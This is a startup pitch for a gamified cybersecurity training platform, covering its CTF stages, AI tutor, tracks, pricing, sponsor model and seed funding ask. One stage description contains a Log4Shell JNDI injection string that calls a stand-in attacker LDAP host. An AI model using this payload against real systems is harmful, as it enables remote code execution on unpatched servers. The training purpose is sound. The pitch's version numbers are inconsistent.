# Kryptós CronOS — The Pitch
**May 2026 | For people who get it**
**Last updated: 2026-05-28 (v1.12.0)**

---

## Here's the problem in one sentence

There are 3.5 million unfilled cybersecurity jobs and every single training product on the market is either boring as hell or impossible to use without a CS degree.

We're fixing that.

---

## What we built

Kryptós CronOS teaches cybersecurity the way it should have always been taught — by actually doing it.

Not watching a guy on YouTube explain SQL injection. Not reading a 400-page study guide. **Actually running the exploit in a simulated environment, on a replica of the real server where it happened.**

Stage 8? You're in a terminal, feeding `${jndi:ldap://attacker.com/x}` into a log parser, watching it call back to your LDAP server — the exact same trick that took down half the internet in December 2021 (Log4Shell, CVSS score: 10.0, the highest possible rating).

Stage 9? You're scanning a network, identifying port 445 open on a Windows box, and exploiting EternalBlue — the NSA-built exploit that WannaCry used to encrypt hospitals across 150 countries.

Then you capture a flag, earn XP, unlock a badge, and the leaderboard updates in real time.

It's a game. It's also real security training. And that combination is genuinely rare.

---

## What exists today (v1.8.3 — live at kryptoscronos.com)

This isn't a pitch deck with a mockup. It's a working product:

- **418 fully built stages** across 36 curriculum epochs and 10 learning tracks
- **ARIA AI tutor** — live in production, powered by Claude Haiku, uses Socratic coaching (guides thinking, doesn't give away answers)
- **Daily streaks and milestone badges** — engagement loop that works
- **Real-time leaderboard** — global, daily, and weekly XP rankings
- **Trophy system** — 51 trophies, 8 rarity tiers, daily rotating showcase with atomic supply reservation
- **Avatar shop** — cosmetic items and trophies purchasable with earned coins
- **Stage completion emails** — fire-and-forget transactional email on every flag capture with XP, badge, streak, and next-stage link
- **Progress export** — downloadable PDF certificate: coins, stages, badges, streak, per-epoch breakdown
- **Admin dashboard** — user management, NDA signatories, DocuSign e-signature integration, CMS stage editor
- **Auth system** — server-side PBKDF2 hashing, HMAC-signed HttpOnly cookies, nonce-based CSP, rate limiting
- **CI pipeline** — automated lint + type check + build + security audit on every commit — 0 ESLint errors
- **Deployed and running:** kryptoscronos.com
- **GitHub:** github.com/jjfleetwood/kryptos-cronos

Built by one founder with an AI development environment. The AI tutor is not a roadmap item — it's live and being used today.

---

## The 10 curriculum tracks we have today

### Track 1: Core Security (42 stages)
The entry point. Our First Journey (30 beginner-friendly CTF stages) + Foundations (12 stages on landmark attacks):
- SQL Injection (Heartland Payment Systems, $130M breach)
- XSS (Samy Kamkar's MySpace worm, 1 million accounts in 20 hours)
- Heartbleed (OpenSSL bug that leaked private keys for 2 years)
- Log4Shell (CVSS 10.0, still being exploited)
- WannaCry / EternalBlue (NHS shut down, $4B in damages)
- Capital One SSRF (100M customer records, metadata endpoint abuse)
- Equifax / Apache Struts (147 million Americans' SSNs, $575M FTC fine)

### Track 2: Tech Audit (48 stages)
The enterprise compliance and SOC operations track. Four epochs:
- **Foundations** — ISACA, COBIT, CISA audit frameworks
- **Technical** — API security, secrets management, cloud IAM
- **Agentic Continuous Monitoring** — Claude tool use, MCP servers, AI-powered audit pipelines
- **Continuous Monitoring 2.0** — SIEM + ML, UEBA, NDR, CSPM, SOAR, deception/honeytokens, Zero Trust, XDR, continuous compliance, SOC maturity (MTTD/MTTR)

### Track 3: Threat Frameworks (24 stages)
- **MITRE ATT&CK** — All 12 tactic phases, nation-state TTPs
- **MITRE ATLAS** — AI/ML adversarial attacks (the MITRE framework for machine learning threats)

### Track 4: AI Security (12 stages)
- **OWASP LLM Top 10 2025** — Prompt injection, training data poisoning, model theft, insecure output handling

### Track 5: Quantum Era (30 stages)
- Quantum threats to current cryptography
- Post-quantum cryptography (NIST PQC standards)
- Quantum key distribution infrastructure

### Track 6: Cisco / Network Defense (50 stages across 4 epochs)
- **Cisco Core CVEs** — real documented Cisco vulnerabilities (IOS XE, ASA, Smart Install, SNMP)
- **Cisco Enterprise Defense** — enterprise network hardening and lateral movement scenarios
- **Cisco SecOps** — alert triage and incident response modeled on Cisco XDR workflows
- **Cisco Advanced Defense + Umbrella** — Firepower NGFW exploitation, DNS tunneling, domain generation algorithms

### Track 7: Crafts (30 stages)
- Creative and operational security contexts

### Track 8: Driving (24 stages)
- Automotive and transportation cybersecurity

### Track 9: Baseball (70 stages)
- Sports analytics security and data integrity challenges

### Track 10: First Journey (onboarding, counted in Core Security)
- Entry-level CTF stages for complete beginners

---

## The AI tutor that's already live

When you're stuck in the terminal and can't figure out why your payload isn't working, you click the ARIA button. It doesn't tell you the answer. It asks you a question.

"What happens when the application evaluates that string as a path? What would you expect to find there?"

It knows which stage you're on. It knows what the vulnerability is. It coaches you to the answer without giving it away. That's Socratic teaching applied to hands-on security training, running on Claude Haiku, live right now.

This is the AI layer that the other platforms are scrambling to bolt on. We shipped it.

---

## The gamification that actually works

- **Linear progression** — you earn access to the next stage by completing this one. No skipping.
- **XP + leaderboard** — people are competitive. This works.
- **Daily streaks** — consecutive-day engagement loop with streak-based badge rewards (3-day streak badge, 7-day streak badge)
- **Milestone badges** — XP milestones (1K XP, 5K XP) plus streak milestones
- **Stage badges** — unique badge for every stage completion ("Log4Shell Hunter," "Zero Day Scout," "SQL Slayer")
- **Reference drawer** — full briefing, technical reference, and attack diagram accessible mid-challenge without leaving the terminal

---

## Who's paying for this

### Direct to consumer
- Free tier: first few stages (gets you hooked)
- Pro: $5.99/month or $55.99/year — everything, plus AI personalization and certificates
- Team: $12/seat for companies with 10+ people in training

### Enterprise
- $8/seat/month at 100+ seats
- SSO, admin dashboards, compliance reporting, custom curriculum
- Target: financial services (SEC now requires cybersecurity disclosure), healthcare (HIPAA), defense contractors (CMMC)

### Sponsors — this is the fun part

Security vendors spend a fortune on brand awareness with practitioners. We give them a better channel than trade show booths:

- **CrowdStrike sponsors the "Threat Hunter" badge** — every learner who earns it gets a CrowdStrike exam voucher. CrowdStrike gets a qualified audience. We get a check.
- **AWS sponsors the SSRF stage** — co-branded "Cloud Security by AWS" stage with AWS free-tier credit for completions
- **CompTIA sponsors certificate verification** — cert discounts embedded in badge completion emails
- **SentinelOne sponsors a weekly CVE challenge** — "SentinelOne Threat Intelligence Challenge of the Week"
- **Cisco is the flagship integration** — this is bigger than a badge sponsorship:
  - **Cisco Talos** powers the weekly CVE challenge feed — real threat intelligence, new CTF every week, co-branded
  - **Cisco Umbrella** sponsors the DNS security curriculum track (already built)
  - **Cisco SecureX / XDR** sponsors an enterprise security operations track
  - **Cisco CyberOps Associate** certification — learners who complete the Cisco epoch get exam vouchers. Cisco gets a pipeline of certified practitioners who trained on their products.
  - **Cisco DevNet** sponsors API security stages for developer-focused learners

### Hints — the Candy Crush model

Free users get one hint per stage, on the house. Hint 2 and hint 3? Watch a 30-second sponsor ad, or upgrade to Pro.

The ads are contextually matched. If you're stuck on the WannaCry stage, the hint comes from CrowdStrike. If you're grinding on SSRF and can't find the metadata endpoint, AWS shows you 30 seconds about cloud security. The ad is relevant, the audience is verified security practitioners, and the CPM reflects it: $50–$200.

The part that matters: every ad impression is also a Pro upgrade prompt. The user is already frustrated enough to want a hint — that's the highest-intent moment in the entire product. Duolingo built a billion-dollar business on this model. We're applying it to the most high-value professional audience in enterprise tech.

---

## Active technology partners (not vaporware)

| Partner | What they do for us today |
|---|---|
| **Vercel** | Hosting and CDN — every git push auto-deploys |
| **Upstash** | Serverless Redis — users, XP, leaderboard, streaks, NDAs |
| **Resend** | Transactional email — welcome, stage completion, password reset |
| **Anthropic** | Claude Haiku — powers ARIA AI tutor, live in production |
| **DocuSign** | eSignature API — NDA envelopes from admin dashboard |
| **GitHub** | Source control + automated CI pipeline |

---

## Why now

Three things converging:

1. **SEC's 2024 cybersecurity disclosure rules** mean every public company's board is asking "do our people actually know security?" The answer is currently no.
2. **AI is making attacks cheaper and faster.** The defender skill gap is widening in real time — and AI security (OWASP LLM Top 10, MITRE ATLAS) is an entirely new curriculum category that didn't exist 18 months ago.
3. **Gen Z learns differently.** Video and games, not textbooks. The platforms that figured out gaming (Duolingo, Brilliant) have proven the model works at scale.

We're bringing that model to the most high-stakes skill gap in enterprise tech, with an AI tutor already running.

---

## The ask

**$1.5M seed to get to Series A in 18 months.**

That buys:
- 2 engineers for a year ($720K)
- AI API budget for ARIA scaling and the adaptive personalization layer ($120K)
- GTM to get to 50,000 users and $1.2M ARR ($300K)
- Infrastructure and security hardening for enterprise sales ($80K)
- Legal, ops, reserve ($280K)

At $1.2M ARR with 50,000 users and a clear enterprise pipeline, Series A is a real conversation at a real valuation.

---

## The one-liner version

**Kryptós CronOS is Duolingo for cybersecurity — except instead of translating Spanish sentences, you're exploiting the same vulnerability that cost Equifax $575 million, with an AI tutor coaching you through it.**

If that sounds like something the market will pay for, let's talk.

---

*kryptoscronos.com | github.com/jjfleetwood/kryptos-cronos*  
*Bolotin Enterprises, Inc. — Delaware C-Corp — incorporated May 23, 2026*
